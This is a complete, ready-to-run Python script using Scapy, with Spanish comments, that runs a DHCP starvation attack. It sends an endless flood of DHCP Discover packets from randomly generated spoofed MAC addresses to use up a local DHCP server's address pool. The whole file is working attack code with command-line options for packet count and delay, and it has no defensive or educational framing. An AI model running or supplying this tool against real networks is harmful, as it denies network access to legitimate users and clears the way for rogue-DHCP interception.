#!/usr/bin/env python3

from scapy.all import *
import random, time, os, sys

IFACE      = "eth0"
DELAY      = 0.1    

def random_mac():
    """Genera una MAC completamente aleatoria."""
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )

def build_dhcp_discover(src_mac):
    """Construye un DHCP Discover con MAC falsa."""
    
    mac_bytes = bytes.fromhex(src_mac.replace(":", ""))
    mac_pad   = mac_bytes + b'\x00' * 10  # chaddr es 16 bytes

    pkt = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(
            op=1,
            chaddr=mac_pad,
            xid=random.randint(1, 0xFFFFFFFF),
        ) /
        DHCP(options=[
            ("message-type", "discover"),
            ("hostname", f"host-{random.randint(1000,9999)}"),
            "end"
        ])
    )
    return pkt

def dhcp_starvation(count, delay, verbose):
    print(f"\n{'='*55}")
    print(f"  DHCP Starvation Attack")
    print(f"  Interfaz : {IFACE}")
    print(f"  Paquetes : {'Infinito' if count == 0 else count}")
    print(f"  Delay    : {delay}s entre peticiones")
    print(f"{'='*55}\n")
    print("[*] Enviando DHCP Discovers con MACs falsas...")
    print("[*] Ctrl+C para detener\n")

    sent  = 0
    start = time.time()

    try:
        while True:
            if count != 0 and sent >= count:
                break

            src_mac = random_mac()
            pkt     = build_dhcp_discover(src_mac)

            try:
                sendp(pkt, iface=IFACE, verbose=False)
                sent += 1

                if verbose or sent % 50 == 0:
                    elapsed = time.time() - start
                    pps     = sent / elapsed if elapsed > 0 else 0
                    print(f"[+] Enviados: {sent:>5} | {pps:>6.1f} pkt/s | MAC falsa: {src_mac}")

                if delay > 0:
                    time.sleep(delay)

            except Exception as e:
                print(f"[!] Error: {e}")
                continue

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start
    print(f"\n{'='*55}")
    print(f"  Total    : {sent} peticiones enviadas")
    print(f"  Tiempo   : {elapsed:.1f}s")
    print(f"  Promedio : {sent/elapsed:.1f} pkt/s")
    print(f"{'='*55}\n")

def main():
    if os.geteuid() != 0:
        print("[!] Ejecuta con sudo")
        sys.exit(1)

    import argparse
    parser = argparse.ArgumentParser(description="DHCP Starvation Attack")
    parser.add_argument("-c", "--count",   type=int,   default=0,   help="Num peticiones (0=infinito)")
    parser.add_argument("-d", "--delay",   type=float, default=0.1, help="Delay entre peticiones")
    parser.add_argument("-v", "--verbose", action="store_true",      help="Mostrar cada peticion")
    args = parser.parse_args()

    dhcp_starvation(args.count, args.delay, args.verbose)

if __name__ == "__main__":
    main()
